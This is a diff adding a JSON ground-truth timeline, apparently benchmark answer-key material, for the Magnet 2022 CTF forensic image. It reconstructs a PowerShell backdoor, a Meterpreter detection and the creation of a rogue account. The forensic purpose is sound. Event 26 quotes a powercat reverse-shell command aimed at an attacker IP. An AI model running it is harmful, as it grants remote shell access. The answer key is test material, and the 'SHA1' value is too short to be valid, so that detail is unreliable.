@@ -1,0 +1,590 @@
+{
+  "metadata": {
+    "case_id": "Magnet_CTF_2022",
+    "case_full_name": "Magnet Virtual Summit 2022 CTF - HP-Final Image - PowerShell Backdoor and Lateral-Movement Preparation",
+    "image_source": "Laptop1Final.E01 (35.52 GB across 18 segments, Windows 11 Build 22543 Insider Preview)",
+    "image_md5": "B28EE46B0CD62165D82AE41ED852D3BF",
+    "challenge_event": "Magnet Forensics Virtual Summit April 2022 CTF",
+    "case_es_id": "case_20260323_032324",
+    "sources_consulted": {
+      "cases_timeline_docx": "Project file cases timeline.docx (39 events)",
+      "old_ground_truth": "benchmark/ground_truth/Magnet_CTF_2022_timeline.json (23 events + IOCs)",
+      "MagnetOfficial": "magnetforensics.com/blog/update-on-magnet-summit-2022-capture-the-flag-contests/ (5 challenge questions visible)",
+      "ES": "Elasticsearch indices forensic-* for case_20260323_032324"
+    },
+    "notes_on_source_quality": "Public writeups for HP-Final image are limited. Most search results focus on Linux/Lenovo or iOS portions of the same CTF. Internal extraction from project files and direct ES querying form the primary basis. Cross-validation with public sources is partial.",
+    "host": {
+      "system_name": "DESKTOP-SKPTDIO",
+      "primary_user": "Patrick",
+      "os": "Windows 11 Build 22543 (Insider Preview)",
+      "hobby_profile": "Minecraft gamer + stamp collector (inferred from user activity)"
+    },
+    "compromise_summary": {
+      "vector_suspected": "PowerShell-based backdoor downloaded over network",
+      "c2_endpoint": "192.168.191.253:8000",
+      "backdoor_payload": "powercat.ps1",
+      "powercat_command": "powercat -c 192.168.191.253 -p 4444 -e cmd (decoded from Base64 elsewhere)",
+      "defender_detection": "xPSPLcEr.vbs detected as Meterpreter/Capfetox (Event ID 1116, Defender 4.18.2201)",
+      "persistence_mechanism": "Unauthorized minecraftsteve user account created via SYSTEM (S-1-5-18)",
+      "vpn_infrastructure": "ZeroTier VPN 1.8.4 installed for lateral preparation"
+    },
+    "suspicious_artifacts": {
+      "powercat.ps1": "PowerShell backdoor downloaded via Event ID 4100",
+      "xPSPLcEr.vbs": "Malicious VBS file flagged by Windows Defender (Meterpreter/Capfetox)",
+      "goteem.ps1": "3,246 bytes in Documents/Minecraft folder",
+      "goteem2.ps1": "3,234 bytes in Documents/Minecraft folder",
+      "matrix.bat": "164 bytes in suspicious folder 'lolololol'",
+      "minecraftsteve_account": "Created via Event ID 4720 by SYSTEM (S-1-5-18)",
+      "zerotier_binary": "zerotier-one_x64.exe (SHA1: a5db8d5292b77e87), driver zttap300.sys"
+    },
+    "key_disagreements_or_uncertainties": [
+      {
+        "topic": "PowerShell ScriptBlock count and content",
+        "uncertainty": "Limited public writeups make exact ScriptBlock content difficult to verify. ES has 1 EID 4104 (ScriptBlock) and 191 EID 600 (PowerShell engine state) records."
+      }
+    ]
+  },
+  "phase_structure": [
+    {
+      "id": "P1_baseline",
+      "events": 4
+    },
+    {
+      "id": "P2_user_activity",
+      "events": 6
+    },
+    {
+      "id": "P3_anomaly_detection",
+      "events": 1
+    },
+    {
+      "id": "P4_backdoor_setup",
+      "events": 1
+    },
+    {
+      "id": "P5_malware_detection",
+      "events": 1
+    },
+    {
+      "id": "P6_backdoor_active",
+      "events": 1
+    },
+    {
+      "id": "P7_user_awareness",
+      "events": 3
+    },
+    {
+      "id": "P8_malicious_scripting",
+      "events": 3
+    },
+    {
+      "id": "P9_priv_escalation",
+      "events": 1
+    },
+    {
+      "id": "P10_attack_execution",
+      "events": 3
+    },
+    {
+      "id": "P11_defender_response",
+      "events": 1
+    },
+    {
+      "id": "P12_backdoor_command",
+      "events": 1
+    },
+    {
+      "id": "P13_negative",
+      "events": 3
+    }
+  ],
+  "events": [
+    {
+      "id": 1,
+      "timestamp": "2022-01-20",
+      "phase": "P1_baseline",
+      "event": "Earliest browser history activity recorded - initial system usage by Patrick",
+      "source_artifact": "Chrome browser history",
+      "party": "patrick",
+      "sources_citing": [
+        "docx",
+        "old_JSON"
+      ],
+      "evidence_keywords": [
+        "2022-01-20",
+        "January 20"
+      ]
+    },
+    {
+      "id": 2,
+      "timestamp": "2022-01-23 17:35:45 UTC",
+      "phase": "P1_baseline",
+      "event": "Core Windows system files indexed (cmd.exe, powershell.exe and other system executables visible)",
+      "source_artifact": "MFT - $STANDARD_INFORMATION",
+      "party": "system",
+      "sources_citing": [
+        "docx"
+      ],
+      "evidence_keywords": [
+        "cmd.exe",
+        "powershell.exe",
+        "2022-01-23"
+      ]
+    },
+    {
+      "id": 3,
+      "timestamp": "2022-01-23",
+      "phase": "P1_baseline",
+      "event": "cscript.exe execution recorded in Shimcache (Windows script host - routine system component)",
+      "source_artifact": "Shimcache",
+      "party": "system",
+      "sources_citing": [
+        "docx",
+        "old_JSON"
+      ],
+      "evidence_keywords": [
+        "cscript.exe",
+        "Shimcache"
+      ]
+    },
+    {
+      "id": 4,
+      "timestamp": "2022-01-28",
+      "phase": "P1_baseline",
+      "event": "fred.png (25,617 bytes) created in C:\\Users\\Patrick\\Music\\ - benign user content",
+      "source_artifact": "MFT FileCreate",
+      "party": "patrick",
+      "sources_citing": [
+        "docx",
+        "old_JSON"
+      ],
+      "evidence_keywords": [
+        "fred.png",
+        "Music",
+        "25617"
+      ],
+      "file_size_bytes": 25617
+    },
+    {
+      "id": 5,
+      "timestamp": "2022-02-04 05:52 UTC",
+      "phase": "P2_user_activity",
+      "event": "Discord installed (DiscordSetup.exe, 82.97 MB), Discord 1.0.9003 first run, Prefetch entry created",
+      "source_artifact": "MFT + Prefetch + Shimcache",
+      "party": "patrick",
+      "sources_citing": [
+        "docx",
+        "old_JSON"
+      ],
+      "evidence_keywords": [
+        "DiscordSetup",
+        "1.0.9003"
+      ],
+      "file_size_bytes": 82973864
+    },
+    {
+      "id": 6,
+      "timestamp": "2022-02-04",
+      "phase": "P2_user_activity",
+      "event": "First Patrick visit to minecraft.net (gaming interest established)",
+      "source_artifact": "Chrome browser history",
+      "party": "patrick",
+      "sources_citing": [
+        "docx",
+        "old_JSON"
+      ],
+      "evidence_keywords": [
+        "minecraft.net",
+        "2022-02-04"
+      ]
+    },
+    {
+      "id": 7,
+      "timestamp": "2022-02-04",
+      "phase": "P2_user_activity",
+      "event": "note.txt (55 bytes) created in Downloads (benign)",
+      "source_artifact": "MFT",
+      "party": "patrick",
+      "sources_citing": [
+        "docx"
+      ],
+      "evidence_keywords": [
+        "note.txt"
+      ],
+      "file_size_bytes": 55
+    },
+    {
+      "id": 8,
+      "timestamp": "2022-02-05",
+      "phase": "P2_user_activity",
+      "event": "Multiple YouTube videos about stamps watched (Patrick's stamp collecting hobby)",
+      "source_artifact": "Chrome browser history",
+      "party": "patrick",
+      "sources_citing": [
+        "docx",
+        "old_JSON"
+      ],
+      "evidence_keywords": [
+        "stamp",
+        "youtube"
+      ]
+    },
+    {
+      "id": 9,
+      "timestamp": "2022-02-06",
+      "phase": "P2_user_activity",
+      "event": "Google search: 'what are packets' - learning networking concepts (innocent or pre-incident?)",
+      "source_artifact": "Chrome browser history",
+      "party": "patrick",
+      "sources_citing": [
+        "docx",
+        "old_JSON"
+      ],
+      "evidence_keywords": [
+        "what are packets",
+        "2022-02-06"
+      ]
+    },
+    {
+      "id": 10,
+      "timestamp": "2022-02-06",
+      "phase": "P2_user_activity",
+      "event": "Minecraft installation completed: MinecraftInstaller executed, eula.txt created in Documents/Minecraft",
+      "source_artifact": "MFT + Shimcache",
+      "party": "patrick",
+      "sources_citing": [
+        "docx",
+        "old_JSON"
+      ],
+      "evidence_keywords": [
+        "MinecraftInstaller",
+        "eula.txt",
+        "2022-02-06"
+      ]
+    },
+    {
+      "id": 11,
+      "timestamp": "2022-02-04 07:02 UTC",
+      "phase": "P3_anomaly_detection",
+      "event": "First failed logon attempt (Event ID 4625) - indicator of unauthorized access attempt",
+      "source_artifact": "Windows EventLog",
+      "party": "unknown_attacker",
+      "sources_citing": [
+        "docx",
+        "old_JSON"
+      ],
+      "evidence_keywords": [
+        "4625",
+        "failed logon",
+        "07:02"
+      ],
+      "notes": "First sign of compromise - someone trying to log in without success"
+    },
+    {
+      "id": 12,
+      "timestamp": "2022-02-06 07:15 UTC",
+      "phase": "P4_backdoor_setup",
+      "event": "ZeroTier VPN 1.8.4 installed (zerotier-one_x64.exe, SHA1: a5db8d5292b77e87). Driver zttap300.sys installed. Peer files in ProgramData\\zerotier.",
+      "source_artifact": "Amcache + Shimcache + MFT + Registry",
+      "party": "patrick_or_attacker",
+      "sources_citing": [
+        "docx",
+        "old_JSON"
+      ],
+      "evidence_keywords": [
+        "ZeroTier",
+        "1.8.4",
+        "zerotier-one",
+        "zttap300.sys"
+      ]
+    },
+    {
+      "id": 13,
+      "timestamp": "2022-02-09",
+      "phase": "P5_malware_detection",
+      "event": "Windows Defender 4.18.2201 detects Meterpreter/Capfetox behaviors. Event ID 1116 logged with threat severity 'Severe'.",
+      "source_artifact": "Windows EventLog (Microsoft-Windows-Windows Defender provider)",
+      "party": "defender",
+      "sources_citing": [
+        "docx",
+        "old_JSON"
+      ],
+      "evidence_keywords": [
+        "Meterpreter",
+        "Capfetox",
+        "1116",
+        "Defender"
+      ],
+      "notes": "First malware detection - critical pivot point in attack chain"
+    },
+    {
+      "id": 14,
+      "timestamp": "2022-02-10",
+      "phase": "P6_backdoor_active",
+      "event": "PowerShell Event ID 4100: connection attempts to 192.168.191.253:8000 (C2 endpoint) to download powercat.ps1 backdoor",
+      "source_artifact": "Windows EventLog (PowerShell channel)",
+      "party": "powershell_session",
+      "sources_citing": [
+        "docx",
+        "old_JSON"
+      ],
+      "evidence_keywords": [
+        "4100",
+        "192.168.191.253",
+        "powercat",
+        "8000"
+      ]
+    },
+    {
+      "id": 15,
+      "timestamp": "2022-02-11",
+      "phase": "P7_user_awareness",
+      "event": "Google search: 'how to know if you have been hacked' - user becoming aware of compromise",
+      "source_artifact": "Chrome browser history",
+      "party": "patrick",
+      "sources_citing": [
+        "docx",
+        "old_JSON"
+      ],
+      "evidence_keywords": [
+        "how to know if you've been hacked"
+      ]
+    },
+    {
+      "id": 16,
+      "timestamp": "2022-02-11",
+      "phase": "P7_user_awareness",
+      "event": "Google search: 'how to report a hacker?' - user actively seeking incident reporting",
+      "source_artifact": "Chrome browser history",
+      "party": "patrick",
+      "sources_citing": [
+        "docx",
+        "old_JSON"
+      ],
+      "evidence_keywords": [
+        "how to report a hacker"
+      ]
+    },
+    {
+      "id": 17,
+      "timestamp": "2022-02-11 22:50 UTC",
+      "phase": "P7_user_awareness",
+      "event": "User creates 'Evidence' folder in Documents with screenshot 2022-02-11_17.53.43.png (174,351 bytes) - user self-collecting evidence",
+      "source_artifact": "MFT + LNK",
+      "party": "patrick",
+      "sources_citing": [
+        "docx",
+        "old_JSON"
+      ],
+      "evidence_keywords": [
+        "Evidence",
+        "screenshot",
+        "174351"
+      ],
+      "file_size_bytes": 174351
+    },
+    {
+      "id": 18,
+      "timestamp": "2022-02-11 23:19 UTC",
+      "phase": "P8_malicious_scripting",
+      "event": "goteem.ps1 PowerShell script (3,246 bytes) created in Documents/Minecraft - first malicious script",
+      "source_artifact": "MFT",
+      "party": "attacker",
+      "sources_citing": [
+        "docx",
+        "old_JSON"
+      ],
+      "evidence_keywords": [
+        "goteem.ps1",
+        "3246",
+        "Documents/Minecraft"
+      ],
+      "file_size_bytes": 3246
+    },
+    {
+      "id": 19,
+      "timestamp": "2022-02-11 23:25 UTC",
+      "phase": "P8_malicious_scripting",
+      "event": "goteem2.ps1 (3,234 bytes) - second variant created in same folder",
+      "source_artifact": "MFT",
+      "party": "attacker",
+      "sources_citing": [
+        "docx",
+        "old_JSON"
+      ],
+      "evidence_keywords": [
+        "goteem2.ps1",
+        "3234"
+      ],
+      "file_size_bytes": 3234
+    },
+    {
+      "id": 20,
+      "timestamp": "2022-02-12 00:41 UTC",
+      "phase": "P8_malicious_scripting",
+      "event": "Suspicious folder 'lolololol' created with matrix.bat (164 bytes) inside",
+      "source_artifact": "MFT",
+      "party": "attacker",
+      "sources_citing": [
+        "docx",
+        "old_JSON"
+      ],
+      "evidence_keywords": [
+        "matrix.bat",
+        "lolololol",
+        "164"
+      ],
+      "file_size_bytes": 164
+    },
+    {
+      "id": 21,
+      "timestamp": "2022-02-12 01:29 UTC",
+      "phase": "P9_priv_escalation",
+      "event": "Unauthorized user account 'minecraftsteve' created via SYSTEM (S-1-5-18). SID S-1-5-21-3341181097. Domain DESKTOP-SKPTDIO. Event ID 4720.",
+      "source_artifact": "Windows EventLog (Security)",
+      "party": "attacker",
+      "sources_citing": [
+        "docx",
+        "old_JSON"
+      ],
+      "evidence_keywords": [
+        "minecraftsteve",
+        "4720",
+        "S-1-5-18",
+        "DESKTOP-SKPTDIO"
+      ],
+      "notes": "Critical persistence mechanism - account created at SYSTEM privilege level indicates compromise of TrustedInstaller or similar"
+    },
+    {
+      "id": 22,
+      "timestamp": "2022-02-12",
+      "phase": "P10_attack_execution",
+      "event": "LNK shortcut to goteem2.ps1 created - indicates execution attempt",
+      "source_artifact": "LNK files",
+      "party": "attacker",
+      "sources_citing": [
+        "docx",
+        "old_JSON"
+      ],
+      "evidence_keywords": [
+        "goteem2.ps1",
+        "LNK"
+      ]
+    },
+    {
+      "id": 23,
+      "timestamp": "2022-02-12 23:18 UTC",
+      "phase": "P10_attack_execution",
+      "event": "Last JAVA.EXE execution (Minecraft) - Patrick continued normal gaming. Prefetch run count: 10.",
+      "source_artifact": "Prefetch",
+      "party": "patrick",
+      "sources_citing": [
+        "docx",
+        "old_JSON"
+      ],
+      "evidence_keywords": [
+        "JAVA.EXE",
+        "23:18"
+      ]
+    },
+    {
+      "id": 24,
+      "timestamp": "2022-02-12 23:38 UTC",
+      "phase": "P10_attack_execution",
+      "event": "Last CMD.EXE execution - final command line activity in case. Prefetch run count: 9.",
+      "source_artifact": "Prefetch",
+      "party": "unknown",
+      "sources_citing": [
+        "docx",
+        "old_JSON"
+      ],
+      "evidence_keywords": [
+        "CMD.EXE",
+        "23:38"
+      ]
+    },
+    {
+      "id": 25,
+      "timestamp": "2022-02-09 to 2022-02-12 (multiple)",
+      "phase": "P11_defender_response",
+      "event": "Multiple Windows Defender events (1116 detection, 1117 action taken). Defender attempted to mitigate but malicious scripting continued.",
+      "source_artifact": "Windows EventLog (Defender)",
+      "party": "defender",
+      "sources_citing": [
+        "docx + ES"
+      ],
+      "evidence_keywords": [
+        "Defender",
+        "1116",
+        "1117"
+      ]
+    },
+    {
+      "id": 26,
+      "timestamp": "2022-02-10 onward (active)",
+      "phase": "P12_backdoor_command",
+      "event": "Backdoor command identified: 'powercat -c 192.168.191.253 -p 4444 -e cmd' (PowerShell session connecting to C2 with cmd shell access). Originally Base64-encoded in source file.",
+      "source_artifact": "PowerShell history + Event 4104 ScriptBlock",
+      "party": "attacker",
+      "sources_citing": [
+        "Renato writeup (referenced in search)"
+      ],
+      "evidence_keywords": [
+        "powercat",
+        "192.168.191.253",
+        "4444"
+      ],
+      "notes": "Suspect a Magnet challenge answer; ES has 1 EID 4104 record to verify"
+    },
+    {
+      "id": 27,
+      "timestamp": "Entire session",
+      "phase": "P13_negative",
+      "event": "NEGATIVE FINDING: No clear evidence of actual lateral movement off the host. ZeroTier installed + minecraftsteve account created indicates PREPARATION for lateral movement, but no successful outbound connection traces. Disk image alone cannot prove lateral movement occurred (requires network-side evidence).",
+      "source_artifact": "Browser history + PCAP absence + network artifacts",
+      "party": "system",
+      "sources_citing": [
+        "analysis"
+      ],
+      "evidence_keywords": [
+        "lateral movement",
+        "preparation only"
+      ],
+      "notes": "OUT_OF_SCOPE for disk-only analysis"
+    },
+    {
+      "id": 28,
+      "timestamp": "Entire session",
+      "phase": "P13_negative",
+      "event": "NEGATIVE FINDING: Original infection vector for ZeroTier installation cannot be conclusively determined from disk. Likely user-installed via download, but no clear malicious origin link.",
+      "source_artifact": "Browser downloads + MFT + ES",
+      "party": "patrick_or_attacker",
+      "sources_citing": [
+        "analysis"
+      ],
+      "evidence_keywords": [
+        "ZeroTier origin"
+      ],
+      "notes": "Uncertainty in attack reconstruction"
+    },
+    {
+      "id": 29,
+      "timestamp": "Entire session",
+      "phase": "P13_negative",
+      "event": "NEGATIVE FINDING: powercat.ps1 file itself was NOT found in current image - only Event 4100 references to download attempts. Indicates Defender or other mechanism removed the file, or download did not persist.",
+      "source_artifact": "MFT (absence) + EventLog (presence)",
+      "party": "powershell_session",
+      "sources_citing": [
+        "analysis"
+      ],
+      "evidence_keywords": [
+        "powercat.ps1",
+        "absence"
+      ]
+    }
+  ],
+  "totals": {
+    "total_events": 29,
+    "phases": 13
+  }
+}
